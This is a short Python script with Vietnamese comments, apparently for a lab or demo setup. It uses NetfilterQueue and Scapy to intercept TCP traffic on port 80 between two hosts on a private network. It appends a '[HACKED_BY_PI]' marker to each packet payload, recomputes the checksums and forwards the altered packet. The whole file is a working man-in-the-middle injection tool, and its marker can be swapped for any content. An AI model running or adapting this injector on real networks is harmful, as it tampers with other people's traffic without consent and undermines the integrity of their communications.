#!/usr/bin/env python3
# injector.py

from netfilterqueue import NetfilterQueue
from scapy.all import *

# Config
DISPLAY_IP = "192.168.195.16"
PI_IP = "192.168.195.15"
TARGET_PORT = 80  # chỉnh theo ứng dụng thật

def process(pkt):
    scapy_pkt = IP(pkt.get_payload())

    # Kiểm tra xem có phải gói cần chỉnh không
    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        if scapy_pkt[IP].src == PI_IP and scapy_pkt[IP].dst == DISPLAY_IP and scapy_pkt[TCP].dport == TARGET_PORT:
            old_payload = scapy_pkt[Raw].load
            print(f"[+] Intercepted: {old_payload}")

            # Thay đổi payload
            new_payload = old_payload + b"\n[HACKED_BY_PI]\n"
            scapy_pkt[Raw].load = new_payload

            # Xóa các trường cần tính lại
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            # Gửi lại gói đã chỉnh sửa
            pkt.set_payload(bytes(scapy_pkt))
            pkt.accept()
            print(f"[+] Modified and forwarded.")
            return

    # Các gói khác để nguyên
    pkt.accept()

# Chạy hàng đợi
nfqueue = NetfilterQueue()
nfqueue.bind(1, process)

print("[*] Waiting for packets... Press Ctrl+C to stop.")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[!] Detected Ctrl+C, exiting.")
    nfqueue.unbind()
